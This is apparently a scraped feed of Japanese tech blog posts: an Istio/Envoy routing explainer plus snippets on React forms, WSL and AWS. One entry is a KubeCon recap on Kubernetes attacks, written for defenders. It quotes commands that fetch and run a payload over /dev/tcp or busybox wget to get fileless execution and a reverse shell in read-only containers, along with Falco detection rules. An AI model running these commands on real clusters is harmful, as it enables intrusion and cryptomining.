ServiceEntry      PeerAuthentication    送信元      リスナー      ✅                  ✅                              ✅    ルート      ✅                  ✅                                  クラスター      ✅                              ✅                  ✅    エンドポイント            ✅                        ✅                      宛先      リスナー                  ✅            ✅                        ✅    ルート                              ✅                            クラスター                                          ✅      ✅      ✅    エンドポイント                                          ✅      ✅          ▶︎ 送信元と宛先のNamespaceについてistio-egress) においた方が良いです。マイクロサービスとは異なるNamespaceにIstio EgressGatewayを置くことで、Istio EgressGatewayをアップグレードしやすくなったり、他から障害の影響を受けにくくなります\uD83D\uDE46\uD83C\uDFFB‍♂️istio-proxyコンテナ内のEnvoyに当てはめるこの表を、HTTPSリクエストの仕組みの中に当てはめると、以下になります。引用した前述の解説のイメージが掴めるかと思います。送信元または宛先Envoyで同じリソースが登場しません 。リソースの種類だけに着目すると、以下になります。送信元または宛先Envoyで同じリソースが登場しないことがわかりやすくなりました。06. 翻訳されたEnvoy設定値を見てみる前章では、Envoyの具体的な設定値まで、言及しませんでした。本章では、さらに具体化します。各リソースの設定の翻訳によって、Envoyの具体的にどのような設定値になっているのかを解説します。Envoyの現在の設定を出力するEnvoyは、現在の設定を確認するためのエンドポイント (/config_dump) を公開しています。これにHTTPSリクエストを送信し、具体的な設定値を出力してみましょう\uD83D\uDC4D\uD83C\uDFFBリスナーを出力する/config_dumpのクエリストリングにresource={dynamic_listeners}をつけると、Envoyのリスナーを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_listeners}\\" | yq -PAdministration interface — envoy 1.37.0-dev-69fe40 documentationConfigDump (proto) — envoy 1.37.0-dev-69fe40 documentation▶ 宛先情報を見やすくするyqコマンドについてyqコマンドでYAMLに変換すると見やすくなります\uD83D\uDC4Dルートを出力する/config_dumpのクエリストリングにresource={dynamic_route_configs}をつけると、Envoyのルートを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_route_configs}\\" | yq -PAdministration interface — envoy 1.37.0-dev-69fe40 documentationConfigDump (proto) — envoy 1.37.0-dev-69fe40 documentationクラスターを出力する/config_dumpのクエリストリングにresource={dynamic_active_clusters}をつけると、Envoyのクラスターを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_active_clusters}\\" | yq -PAdministration interface — envoy 1.37.0-dev-69fe40 documentationConfigDump (proto) — envoy 1.37.0-dev-69fe40 documentationエンドポイントを出力する/config_dumpのクエリストリングにinclude_edsをつけると、Envoyのエンドポイントを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?include_eds\\" | yq -PAdministration interface — envoy 1.37.0-dev-69fe40 documentationConfigDump (proto) — envoy 1.37.0-dev-69fe40 documentationSupported load balancers — envoy 1.37.0-dev-69fe40 documentation証明書を出力する/config_dumpのクエリストリングにresource={dynamic_active_secrets}をつけると、証明書を出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_active_secrets}\\" | yq -PConfigDump (proto) — envoy 1.37.0-dev-69fe40 documentationサービスメッシュ外からのHTTPSここでは、istio-proxyコンテナはHTTPSリクエストを処理するとします。図中の番号に沿って、通信の仕組みを解説します。送信元Pod側のistio-proxyコンテナ送信元マイクロサービスからのHTTPSリクエストの宛先ポート (例：50000) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50000) 。HTTPSリクエストを処理するための各種フィルターを選びます。また、宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50000) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：50000) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：foo-service.foo-namespace.svc.cluster.local) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートやホストで管理しています (例：outbound|50010|foo-service.foo-namespace.svc.cluster.local) 。設定した負荷分散方式 (例：ラウンドロビンなど) に応じて、Service配下のPodを選びます。Envoyは、エンドポイントをPodのIPアドレスや宛先ポートで管理しています (例：<PodのIPアドレス>:50000) 。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod側のistio-proxyコンテナL7ロードバランシングされたHTTPSリクエストの宛先ポート (例：50000) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50000)HTTPSリクエストを処理するための各種フィルターを選びます。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50000) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：inbound|50000||) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：example.com) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートで管理しています (例：inbound|50000||) エンドポイントを選びます。Envoyは、エンドポイントをローカルホストや宛先ポートで管理しています (例：127.0.0.6:50000) 。  ローカルホストにHTTPSリクエストを送信します。結果的に、宛先マイクロサービスにHTTPSリクエストが届きます。Istio Ingress vs. Kubernetes Ingress – Daniel Watrous on Software and Cloud Engineering▶︎ istio-proxyコンテナのプロキシ先のIPアドレスについてistio-proxyコンテナは、ローカルホストを127.0.0.6とし、HTTPSリクエストをマイクロサービスに送信します。これは、127.0.0.1を指定してしまうと、istio-proxyコンテナからマイクロサービスへの通信がiptables上でループしてしまうためです。istio-proxyコンテナからマイクロサービスへの通信では、正しくはiptables上でISTIO_OUTPUTからPOSTROUTINGに通信を渡します。一方で、もしローカルホストが127.0.0.1であると、ISTIO_OUTPUTからISTIO_IN_REDIRECTに通信を渡すことになり、istio-proxyコンテナに再びリダイレクトしてしまいます。hatappi1225さんの解説が鬼わかりやすかったです\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F画像引用元：mercari engineeringInbound Forwarding - Google ドキュメントiptables から理解する Istio 1.10 から変更された Inbound Forwarding | メルカリエンジニアリングマイクロサービス間のHTTPSここでは、istio-proxyコンテナはHTTPSリクエストを処理するとします。図中の番号に沿って、通信の仕組みを解説します。送信元Pod側のistio-proxyコンテナ送信元マイクロサービスからのHTTPSリクエストの宛先ポート (例：50010) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50010) 。HTTPSリクエストを処理するための各種フィルターを選びます。また、宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50010) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：50010) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：foo-service.foo-namespace.svc.cluster.local) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートやホストで管理しています (例：outbound|50010|foo-service.foo-namespace.svc.cluster.local) 。設定した負荷分散方式 (例：ラウンドロビンなど) に応じて、Service配下のPodを選びます。Envoyは、エンドポイントをPodのIPアドレスや宛先ポートで管理しています (例：<PodのIPアドレス>:50010) 。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod側のistio-proxyコンテナL7ロードバランシングされたHTTPSリクエストの宛先ポート (例：50010) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50010)HTTPSリクエストを処理するための各種フィルターを選びます。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50010) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：inbound|50010||) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：example.com) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートで管理しています (例：inbound|50010||) エンドポイントを選びます。Envoyは、エンドポイントをローカルホストや宛先ポートで管理しています (例：127.0.0.6:50010) 。  ローカルホストにHTTPSリクエストを送信します。結果的に、宛先マイクロサービスにHTTPSリクエストが届きます。https://www.zhaohuabing.com/post/2018-09-25-istio-traffic-management-impl-intro/サービスメッシュ外へのHTTPSここでは、istio-proxyコンテナはHTTPSリクエストを処理するとします。図中の番号に沿って、通信の仕組みを解説します。送信元Pod側のistio-proxyコンテナ送信元マイクロサービスからのHTTPSリクエストの宛先ポート (例：443) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_443) 。HTTPSリクエストを処理するための各種フィルターを選びます。また、宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：443) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：443) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：istio-egressgateway-service.foo-namespace.svc.cluster.local) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターをIstio EgressGateway 宛先ポートやホストで管理しています (例：outbound|443|istio-egressgateway-service.foo-namespace.svc.cluster.local) 。設定した負荷分散方式 (例：ラウンドロビンなど) に応じて、Istio EgressGateway Service配下のPodを選びます。Envoyは、エンドポイントをPodのIPアドレスや宛先ポートで管理しています (例：<PodのIPアドレス>:443) 。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、Istio EgressGateway PodにL7ロードバランシングします。宛先Pod (Istio EgressGateway Pod) 側のistio-proxyコンテナL7ロードバランシングされたHTTPSリクエストの宛先ポート (例：443) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_443)HTTPSリクエストを処理するための各種フィルターを選びます。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：443) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：inbound|50010||) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：external.com) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートやホストで管理しています (例：outbound|443|external.com) 。エンドポイントを選びます。Envoyは、エンドポイントをエントリ済システムのIPアドレスや宛先ポートで管理しています (例：:50010) 。エントリ済システムのIPアドレスは、開発者が設定する必要はなく、EnvoyがDNSから動的に取得します。  エントリ済システムにHTTPSリクエストを送信します。Using Istio to MITM our users’ traffic | Steven ReitsmaIngress, egress, ServiceEntry DATA Flow issues for ISTIO API Gateway? - Discuss Istio07. おわりにIstioサイドカーメッシュがEnvoyのHTTPSリクエストの処理をどのように抽象化するのか、またEnvoyがどのようにHTTPSリクエストを処理するのかを解説しました。次々とサービスメッシュツールが登場したとしても、それがEnvoyを使用したサービスメッシュである限り、最終的にはEnvoyの設定値に行き着きます。そのため、抽象化されたEnvoyがどのように通信を扱うのかを一度でも理解すれば、様々なサービスメッシュツールで知識を流用できると思います。Istioはもちろん、他のEnvoyによるサービスメッシュツール (Consul、Ciliumなど) を使っている方の参考にもなれば幸いです\uD83D\uDC4D\uD83C\uDFFB謝辞今回、Kubernetesのネットワークを調査するにあたり、以下の方に知見をご教授いただきました。@ken5owata さんこの場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackオライリージャパンAmazon","isoDate":"2024-01-15T16:34:04.000Z","dateMiliSeconds":1705336444000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"k8sgpt-operator 開発メモ (ARM Mac 向け)","link":"https://zenn.dev/tozastation/articles/711f2bff2cc656","contentSnippet":"Kubernetes クラスタ構築 AMD64 コンテナ環境セットアップ ~ Lima VM ~https://github.com/lima-vm/limaGetting Started については README.md 参照Limaでは、事前に定義した内容でVMを作ることができますDocker 環境を構築する場合のサンプルも公開されていますhttps://github.com/lima-vm/lima/blob/master/examples/docker.yaml今回は、amd64 の VM を作成したいため、docker.yaml に以下の行を追記...","isoDate":"2024-01-10T00:17:57.000Z","dateMiliSeconds":1704845877000,"authorName":"tozastation","authorId":"tozastation"},{"title":"WSL の Linux から Windows のブラウザで URL を開く","link":"https://blog.1q77.com/2024/01/open-browser-in-wsl/","contentSnippet":"課題WSL の Linux 内で awscli を使って SSO 認証する場合の aws sso login 実行時や GitHub の CLI である gh (cli.github.com ) コマンドで gh auth login を実行した場合に可能であれば自動でブラウザで指定の URL が開かれますが、WSL の場合、Linux 内のブラウザを使うわけではないため何も設定していない状態だと開いてくれないのでひと手間かかって面倒です。","isoDate":"2024-01-07T11:43:53.000Z","dateMiliSeconds":1704627833000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"2023年の振り返りをする","link":"https://nnaka2992.hatenablog.com/entry/zatu/2023_furikaeri","contentSnippet":"みんな振り返りしてる。振り返りしてないのはお前だけ。なので振り返りします。登壇関係2023-06-22 3-shake SRE Tech Talk #6これまで対外向けの登壇は行なったことが無かったのでこれが登壇デビューでした。DBREノススメ所属会社である株式会社スリーシェイクの主催するイベントでしたが、一度登壇すると登壇のハードルが低くなるのでとてもいい機会でした。今の会社にDBREerポジションで入社して6か月目の登壇なので今見ると当時と違う意見の部分もあったりしますが、今もDBREもSREも何なのか分かりません。2023-09-26 YugabyteDB Japan Meetup #3別件でYugabyte Japanの方と話していたところ、登壇してみないか？ と誘われたためホイホイ話しに行った登壇でした。紹介 データベース信頼性エンジニアリングSRETTの方ではSREの存在を認知している方が多いだろうと想定して何故DBREが必要なのか？ という話しをしたのに対して、こちらではDB関係者が多いと想いDBAとDBREという切り口で発表しました。YugabyteDBはドキュメントを始めから読む活動をしていたり(2023年後半はあまり出来ていませんが)、ローカル環境で動かして遊んだりはしていたもののYugabyteDBについて話せるほどの理解は(今も)なく次にYugabyteDB Japan Meetupで話す機会があればYugabyteDBについてを主題に話したいと思いました。2023-10-12 3-shake SRE Tech Talk #76月の登壇と同様に所属会社主催のイベントでした。KubernetesでDBを動かしたい2021年ごろにDBをKubernetesで動かす記事見て以来DB on Kubernetesには興味があったのですが、Kubernetes自体やデータベースのお勉強をしていたらなかなかDB on k8sまでたどりつけていませんでした。それをイベント駆動で無理やり勉強したのがこのイベントでした。内容としてはありきたりですが、Zalando Postgres Operatorを動かしましたというだけのものですが、ここでDB on k8sをさわってからはいろいろな機会でDB on k8sを触るようになりました。2023-12-26 第44回 PostgreSQLアンカンファレンス@オンライン年内最後の登壇はPostgreSQLアンカンファレンスでした。pgrollで実現するスキーマブルーグリーンデプロイメントちょうど登壇しやすいネタを抱えてたのとアドベントカレンダーでそーだいさんが運用・開発よりの話しが足りないと書いていたのを見て、DBREを名乗っているし話さなきゃいけないだろと思ったので登壇しました。もっと運用よりだったりサービス開発だったり設計よりの話も募集中です。 大体そういうの喋る担当が自分だけなのでめちゃめちゃ需要があるので気軽にどうぞ。登壇自体はpodman-composeとdocker composeの差分で悲しいライブデモになりました。検証環境と登壇環境はそろえなきゃいけないなと思いました。ブログ関連はてなブログでは主に読んだ論文やドキュメントについてまとめ、zennでは何かを調べてまとめたものや検証した結果をまとめるように使い分け運用しました。はてなブログでやっているYugabyteDBのドキュメントを全部読む取り組みは途中で止ってしまっているので動かします。zennの方は社内向けに話すもののうち社外に出しても問題ないようなものを垂れ流していましす。2024年は技術検証方面に力をいれたいのでzennを活発に出来たらなと思います。アドベントカレンダーは大風呂敷で畳みきれなかったデータベースエンジニアのためのDB on Kubernetes入門ガイドに始まり、誰得なのかわからないAlloyDB omni on Kubernetesを眺めると続いて、sqldefとpgrollを利用したPostgreSQLでのスキーマブルーグリーンデプロイメントを書きました。ターゲットは誰だったんですかね？まとめ2023年は今までインプット重視だったところからアウトプットを考えだした年でした。これはそろそろアウトプットをしなきゃいけないという思いもあったものの、2023年1月に現職に転職し社外へのアウトプットをする人が多くいたからという面も多大にあります。人は周りの5人の平均になるという言葉があるらしいですが、まさしくその例で環境が変り周りの人が変ったため個人の方向性も変ったのではないかと思います。外部にアウトプットすることが偉いわけではありませんが、外部に発信すると新しい機会も産まれましたし1来年以降も継続していきたいです。↩","isoDate":"2023-12-31T13:00:10.000Z","dateMiliSeconds":1704027610000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"KubeCon NA 2023 Recap: Attacking Kubernetes 編","link":"https://kyohmizu.hatenablog.com/entry/2023/12/31/040720","contentSnippet":"本記事は 3-shake Advent Calendar 2023 最終日の記事です。こんにちは、きょー (@kyohmizu) です少し旬を逃してしまいましたが、KubeCon NA 2023 の振り返りをしたいと思います。私はKubeConにはリアル参加しておらず、後からセッション動画を見ました。Kubernetes 編」ということで、Kubernetes へのサイバー攻撃テクニックに関するセッションを3つご紹介します。ちなみに本内容は、先日開催された CloudNative Days Tokyo 2023 にてお話しするか検討していたのですが、準備期間とセッション時間 (20分) の都合で泣く泣く諦めたものになります。 speakerdeck.comそれではセッション紹介に入ります。K8s Post-Exploitation: Privilege Escalation, Sidecar Container Injection, and Runtime Securityセッション情報Kubernetes クラスタに侵入した攻撃者が行う攻撃手法と、その対策を紹介するセッションです。最初に TeamTNT の行った攻撃キャンペーンについて、過去の調査レポートをベースに説明しています。クラスタへの初期アクセスの後、kubelet API のデフォルトポート (10250) を狙ってネットワークスキャンをかけています。スキャンによって kubelet API を発見した場合、kubelet API にPOSTリクエストを送り、最終的にノード内の全コンテナに対しクリプトマイナーをダウンロードします。詳細は調査レポートを参照いただきたいですが、攻撃コードを見るとどのように攻撃が行われるのかイメージしやすいと思います。この攻撃はアプリコンテナ内でクリプトマイナーを実行するため、早期に発見されてしまう可能性があります。そこでより発見されにくい攻撃手法として、セッション後半では「Sidecar Injection 攻撃」を取り上げています。Sidecar Injection 攻撃 は Microsoft の「Threat Matrix for Kubernetes」で紹介されている攻撃テクニックです。ちなみに MITRE ATT&CK の Containers Matrix にはこのテクニックは含まれていません。Sidecar Injection 攻撃は名前の通り、Pod 内のサイドカーコンテナを標的とします。セッション内で攻撃のサンプルコードが公開されていましたが、Pod 内のサイドカーコンテナのみを選択しクリプトマイナーを実行することを目的としているようでした。個人的にあまりピンと来なかったのは、アプリコンテナではなくサイドカーコンテナを狙うことで本当に攻撃を秘匿できるのか？という点です。サイドカーかはあまり関係ない気がします。そして最後に、これらの攻撃に対するセキュリティ対策について説明しています。Kubernetes セキュリティとして、イメージスキャンアドミッションコントロールランタイムセキュリティの3つのカテゴリを挙げ、実行中のコンテナに対する攻撃にはランタイムセキュリティが有効であると述べています。Falco を取り上げ、今回の攻撃に対する Falco ルールも公開されました。- list: shell_binaries  items: [bash, csh, ksh, sh, tcsh, zsh, dash]- macro: shell_procs  condition: proc.name in (shell_binaries)- rule: shell_in_container  desc: notice shell activity within a container  condition: >    spawned process and    container and    shell_procs  output: >    shell in a container    (user=%user.name container_id=%container.id container_name=%container.name    shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline)  priority: WARNINGArbitrary Code & File Execution in R/O FS – Am I Write?セッション情報readOnlyRootFilesystem: true が設定されたコンテナにおいて、コンテナ内で攻撃コードを実行するテクニックを3つ紹介しています。Readonly Filesystem では、ファイルの読み込み (Read) と実行 (Execute) はできるが書き込み (Write) ができないという特徴があります。マルウェアを配置したりすることを防止します。ファイルレスマルウェアの攻撃も存在しますが、コンテナ内に curl や wget のようなツールが含まれていなければマルウェアをダウンロードできません。それではセッション内の3つのケースについて見ていきます。ここではすべてを紹介しきれないため、より詳しく知りたい方は動画を見たりツールを調べたりしてみてください。ケース1curl や wget のようなネットワークツールがない場合、どのように攻撃コードのファイルをダウンロードするのでしょうか？/dev/tcp を利用して TCP コネクションを確立し、ファイルをダウンロードしています。ただしダウンロードしたファイルを書き込むことはできないため、メモリ上で直接実行する必要があります。これには DDExec を使い、プロセスをハイジャックすることでファイルレス実行を可能にします。$ function __bindown () {  read proto server path <<<$(echo ${1//// })  FILE=/${path// //}  HOST-${server//:*}  PORT=${server//*:}  [[ x\\"$(HOST)\\" == x\\"${PORT}\\" ]] && PORT=8080  exec 3<>/dev/tcp/${HOST]/$PORT  echo -en \\"GET ${(FILE) HTTP/1.0\\\\r\\\\nHost: $(HOST)\\\\r\\\\n\\\\r\\\\n\\" >&3  (while read line; do  [[ \\"$line\\" == $\'\\\\r\' ]] && break  done && cat) <&3  exec 3>&-}$ __bindown http://192.168.88.4:8080/shell.b64 | bash <(__bindown http://192.168.88.4:8080/ddexec.sh)base64 エンコードした攻撃用バイナリと ddexec.sh をそれぞれダウンロードし、ddexec.sh は bash で実行します。ケース2今回はコンテナイメージとして alpine を利用しています (ケース1は nginx でした)。alpine には bash が存在せず、/dev/tcp をそのまま実行することができないため、別の方法でファイルのダウンロードを試みます。curl や wget は存在しませんが、alpine には busybox がインストールされています。ファイルのダウンロードには busybox wget を利用し、ダウンロード先には Readonly RootFS の中でも書き込み可能な tmpfs を選択しています。$ mount | grep shmshm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)バイナリコードを直接実行できる ddsc.sh をダウンロードし、/dev/shm に保存します。noexec でマウントされているためファイルの実行はできませんが、ddsc.sh はシェルスクリプトなので sh から実行可能です。$ dde=$(mktemp -p /dev/shm)$ busybox wget -O - https://raw.githubusercontent.com/arget13/DDexec/main/ddsc.sh > $dde$ code=$(mktemp -p /dev/shm)$ echo \\"6a295899...60f05\\" > $code$ sh $dde -x < $codeケース3ケース2と同じマニフェストから作られた alpine コンテナの環境です。ファイルのダウンロードには引き続き busybox を利用しています。termination-log にファイルを保存し、リンカを利用してファイルを実行します。Kubernetes にはコンテナの終了メッセージを取得する機能があり、取得元ファイルのデフォルトパスが /dev/termination-log となっています。元々終了メッセージを書き込むことを想定したファイルなので、当然ながら書き込み可能です。これを攻撃用ファイルのダウンロード先に利用します。(終了メッセージの詳細は公式ドキュメントを参照ください)$ mount | grep termination-log/dev/vda1 on /dev/termination-log type ext4 (rw,relatime)mount コマンドの結果から、termination-log のマウントには noexec 属性がついていないことがわかります。これによりリンカを利用したファイル実行が可能となります。$ lddmusl libc (x86_64)Version 1.2.4_git20230717Dynamic Program LoaderUsage: /lib/ld-musl-x86_64.so.1 [options] [--] pathnameldd コマンドにより、リンカの使い方は /lib/ld-musl-x86_64.so.1 [実行ファイルのパス] であることがわかりました。あとは攻撃用ファイルをダウンロードして実行するだけです。$ busybox wget -O - https://raw.githubusercontent.com/arget13/DDexec/main/c-shell > /dev/termination-log$ /lib/ld-musl-x86_64.so.1 /dev/termination-logケース1, 2と同様、実行後にはリバースシェルが確立されています。攻撃テクニックの説明は以上となります。seccomp や SELinux の活用termination-log の場所の指定コンテナ内の通信やプロセスの監視seccomp や SELinux は対策としては一般的ですが、termination-log については聞いたことがなく、興味深い内容でした。ただしログの場所を変更できても noexec を付与する方法は見つけられなかったので、有効な対策と言えるかどうかはやや疑問が残りました。ケース2の /dev/shm を利用した攻撃については、検知するための Falco ルールも例示されました。- rule: Execution from /dev/shm  desc: This rule detects file execution from the /dev/shm directory,    a common tactic for threat actors to stash their readable+writable+(sometimes)executable files.  condition: >    spawned_process and    (proc.exe startswith \\"/dev/shm/\\" or    (proc.cwd startswith \\"/dev/shm/\\" and proc.exe startswith \\"./\\" ) or    (shell_procs and proc.args startswith \\"-c /dev/shm\\") or    (shell_procs and proc.args startswith \\"-i /dev/shm\\") or    (shell_procs and proc.args startswith \\"/dev/shm\\") or    (proc.args contains \\"/dev/shm\\" or proc.cwd startswith \\"/dev/shm\\") or    (proc.cwd startswith \\"/dev/shm/\\" and proc.args startswith \\"./\\" ))    and not container.image.repository in (falco_privileged_images, trusted_images)  output: \\"File execution detected from /dev/shm    (proc.cmdline=%proc.cmdline connection=%fd.name user.name=%user.name user.loginuid=%user.loginuid    container.id=%container.id evt.type=%evt.type evt.res=%evt.res proc.pid=%proc.pid proc.cwd=%proc.cwd proc.ppid=%proc.ppid    proc.pcmdline=%proc.pcmdline proc.sid=%proc.sid proc.exepath=%proc.exepath user.uid=%user.uid    user.loginname=%user.loginname group.gid=%group.gid group.name=%group.name container.name=%container.name image=%container.image.repository)\\"  priority: WARNING本セッションは発表者が6月に投稿した記事をもとにしているようなので、併せて読んでいただくと良いかもしれません。また資料中の Pod のマニフェストはそのまま apply するとエラーになるため、ご自身で環境を再現したい方は以下をご利用ください。ケース1:apiVersion: v1kind: Podmetadata:  name: method1-podspec:  containers:  - name: nginx    image: nginx:latest    securityContext:      readOnlyRootFilesystem: true      runAsUser: 101    ports:    - containerPort: 80    volumeMounts:    - mountPath: /var/run      name: run    - mountPath: /var/cache/nginx      name: nginx-cache  securityContext:    seccompProfile:      type: RuntimeDefault  volumes:  - name: run    emptyDir: {}  - name: nginx-cache    emptyDir: {}ケース2, 3:apiVersion: v1kind: Podmetadata:  name: method2-podspec:  containers:  - name: alpine    image: alpine    command:      - sleep    args:      - \\"3600\\"    securityContext:      readOnlyRootFilesystem: true      runAsUser: 65534  securityContext:    seccompProfile:      type: RuntimeDefaultRBACdoors: How Cryptominers Are Exploiting RBAC Misconfigsセッション情報system:anonymous ユーザーに cluster-admin ロールを付与していた場合の攻撃事例を紹介しています。cluster-admin は事前定義された ClusterRole で、クラスタ内のすべてのリソースに対する権限を持っています。system:anonymous は匿名リクエストに対して割り当てられているユーザーです。Kubernetes クラスタに対して認証なしであらゆるリソース操作ができてしまいます。今回の攻撃シナリオは以下の通りです。Kubernetes API Server をスキャンし、設定ミスのあるクラスタを発見DaemonSet としてクリプトマイナー (XMRig) を設置cluster-admin の証明書を作成し、クラスタへの侵害を永続化証明書作成の痕跡を削除興味深い点として、クリプトマイナーを設置する際に ClusterRoleBinding と DaemonSet を作成しますが、リソース名を kube-controller とすることで正規のリソースを偽装しています。運用業務でクラスタ内のリソースを確認したとしても、クリプトマイナーの存在に気づかないかもしれません。リポジトリも kubernetesio/~ のように偽装しています。また今回はCSRを削除していますが、cluster-admin を持っていれば、クラスタ内で行われる検知の回避や防御の無効化も容易にできてしまいます。クラスタとは別のレイヤーで、監査ログの監視などを行う必要があるかもしれません。パブリッククラウドを利用する場合、クラスタ内のセキュリティ対策とクラウド上の監視サービスを併用するのが良さそうです。セッション後半では、取るべきセキュリティ対策について紹介しています。Kubernetes API Server へのアクセスのネットワーク制限--anonymous-auth=false による匿名リクエストを無効化アドミッションコントローラーによる cluster-admin のバインディング禁止検知策として、設定ミスの検知Kubernetes API への攻撃の検知マイニングの検知のそれぞれ3つの対策が挙げられています。設定ミスの対策では、system:anonymous や system:authenticated に付与された権限がないか確認するためのスクリプトが紹介されています。Kubernetes の監査ログを監視することも有効です。Google Cloud の Security Command Center (SCC) には脅威検知の機能がありますが、この機能を利用すれば GKE に対する設定ミスや攻撃を検知できます。(発表者は Google Cloud の方です)マイニングの検知について、IoC (Indicator of Compromise) を利用する方法がセッション内では紹介されています。既知のマルウェアコンテナや悪意のあるバイナリ、攻撃サーバのIPアドレス等と照合することで攻撃を検知します。SCC におけるマイニング検知のベストプラクティスも興味があれば読んでみてください。おわりにいかがだったでしょうか？Kubernetes への攻撃手法を知ることは、(それ自体面白いというのもありますが) リスクベースのセキュリティ対策を検討する上で非常に有用です。このセキュリティ対策はどのような攻撃リスクを軽減してくれるのかこの攻撃が行われた場合、どのセキュリティ対策によって防ぐことができるのかといった観点で考えてみることをお勧めします。Kubernetes クラスタを目指して、皆で取り組んでいきましょう。","isoDate":"2023-12-30T19:07:20.000Z","dateMiliSeconds":1703963240000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"フォームライブラリに依存しないReactコンポーネント設計","link":"https://zenn.dev/kimitsu/articles/clean-react-form-architecture","contentSnippet":"背景React ではフォームライブラリを利用する場合、ナイーブに実装するとフォームの UI とフォームライブラリが密結合になります。これは特定のフォームライブラリに限った話ではなく、React Hook Form, Formik, React Final Form といった主要なフォームライブラリ全てで当てはまる問題です。例えば React Hook Form では、フォーム全体の設定をuseFormで行い、各属性ではregister, Controller, useControllerを使って UI と React Hook Form を接続します。つまりフォームコンポーネ...","isoDate":"2023-12-30T06:07:24.000Z","dateMiliSeconds":1703916444000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Step Functionsを利用してNAT Gatewayを自動作成/削除する","link":"https://qiita.com/ys1/items/abf8daab19f616b3d854","contentSnippet":"概要本記事ではStep Functionsを利用して、Nat Gatewayを自動で作成/削除する方法について記載します。NAT Gatewayは作成しているだけでコストがかかるリソースであり、開発環境の利用していない時間帯などは停止(削除)することでコスト削減につな...","isoDate":"2023-12-29T15:25:41.000Z","dateMiliSeconds":1703863541000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"パフォーマンスを気にするならReact Hook Formが無難","link":"https://zenn.dev/kimitsu/articles/react-form-library-performance","contentSnippet":"最近、React のフォームライブラリを調査しました。その中でパフォーマンスについての言及は見かけるものの、実際に計測しているものが見当たらなかったので計測してみました。結論としては React Hook Form でなくても良いけど、パフォーマンスを気にするなら React Hook Form を選んでおくのが無難というところに落ち着きました。 要約入力欄 10 個、CPU 6\xd7 slowdown での計測結果ライブラリ1 文字入力した場合の再描画React Hook Form8ms 前後Formik100ms 前後Formik（<F...","isoDate":"2023-12-29T14:00:56.000Z","dateMiliSeconds":1703858456000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"K8sGPT: Log Analyzer","link":"https://zenn.dev/tozastation/articles/3e2b9e887639f4","contentSnippet":"Filter 一覧➜  k8sgpt filters listActive:> 